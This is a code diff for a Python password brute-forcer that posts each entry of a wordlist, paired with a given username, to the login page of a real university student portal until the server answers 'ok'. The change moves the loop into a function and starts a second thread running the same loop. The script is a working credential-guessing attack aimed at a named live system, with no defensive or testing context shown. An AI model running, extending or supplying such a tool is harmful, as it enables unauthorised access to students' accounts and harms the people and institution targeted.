@@ -10,6 +10,7 @@ Usage:
 [+]run: python GctuSip_bruteforcer.py -u <username> -w <wordlist>
 
 '''
+import threading
 import requests
 import argparse
 
@@ -28,19 +29,24 @@ url = 'https://erp.gctu.edu.gh/sip/auth/login.php'
 
 
 #reading wordlist file
-with open(wordlists_path) as wordlists:
-    try:
-        for passwd in wordlists.readlines():
-            passwd = passwd.strip('\n')
-            data = {'username':username, 'password':passwd}
-            r = requests.post(url, data=data)
-            if r.text == 'ok':
-                print("Password found:%s" %(passwd))
-                break
-            else:
-                print("[*]checking %s with username:%s and password:%s" %(url, username, passwd) )
-    except KeyboardInterrupt:
-        print("[+]Quitting... ")
+def main():
+    with open(wordlists_path) as wordlists:
+        try:
+            for passwd in wordlists.readlines():
+                passwd = passwd.strip('\n')
+                data = {'username':username, 'password':passwd}
+                r = requests.post(url, data=data)
+                if r.text == 'ok':
+                    print("Password found:%s" %(passwd))
+                    break
+                else:
+                    print("[*]checking %s with username:%s and password:%s" %(url, username, passwd) )
+        except KeyboardInterrupt:
+            print("[+]Quitting... ")
+
+t1 = threading.Thread(target=main)
+t1.start()
+main()
 
 
 
